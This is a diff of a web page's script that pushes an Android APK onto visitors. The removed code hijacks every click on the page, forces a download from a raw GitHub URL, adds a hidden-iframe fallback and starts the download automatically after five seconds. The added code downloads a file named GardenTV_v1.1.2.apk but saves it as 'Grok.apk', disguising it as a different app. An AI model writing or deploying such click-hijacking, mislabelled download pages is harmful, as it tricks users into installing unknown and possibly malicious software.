@@ -464,60 +464,21 @@ margin-bottom: 24px;
 
     <!-- Any click triggers download logic + prevents default redirection -->
     <script>
-    // Define a download link variable for easy modification.
-    const apkUrl = "https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"; 
-    
-    // Instead of a permanent lock, we use a temporary "cooldown" flag.
-    let isProcessing = false; 
+        function startDownload() {
+            // 请替换为实际的 APK 文件链接
+            const downloadUrl = "https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"; 
+            const a = document.createElement('a');
+            a.href = downloadUrl;
+            a.download = 'Grok.apk';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
 
-    function startDownload() {
-        // If a request is currently being processed (within the 2s cooldown), ignore this click.
-        if (isProcessing) return; 
-        
-        // Lock it temporarily
-        isProcessing = true;
-        console.log("Start download task...");
-        
-        // --- 1. Main Method: Location Redirect ---
-        // This is the most reliable method for mobile browsers to trigger a download prompt without opening a new tab.
-        window.location.href = apkUrl;
-        
-        // --- 2. Backup Method: Iframe ---
-        // If the redirect doesn't work on specific browser versions, this hidden iframe forces the request.
-        setTimeout(() => {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = apkUrl;
-            document.body.appendChild(iframe);
-        }, 500);
-
-        // --- 3. Unlock Logic ---
-        // automatically unlock after 2 seconds.
-        // This allows the user to trigger the download again if they accidentally clicked "Cancel".
-        setTimeout(() => {
-            isProcessing = false;
-            console.log("Cooldown finished. User can click to download again.");
-        }, 500);
-    }
-
-    // Listen for full-screen clicks (capture phase)
-    document.addEventListener('click', function(e) {
-        // Prevent default behavior (e.g., stops links from navigating away, stops form submissions)
-        e.preventDefault(); 
-        e.stopPropagation(); 
-        
-        // Trigger download immediately on user interaction
-        startDownload();
-    }, true);
-
-    // Page loading logic
-    window.onload = function() {
-        // Automatically attempt to download after 5 seconds
-        setTimeout(() => {
-            console.log("Automatic timer triggered");
-            startDownload();
-        }, 5000);
-    }
-</script>
+        window.onload = function() {
+           // setTimeout(startDownload, 50000); // 延迟 1.5 秒后自动下载
+        }
+    </script>
 </body>
 </html>
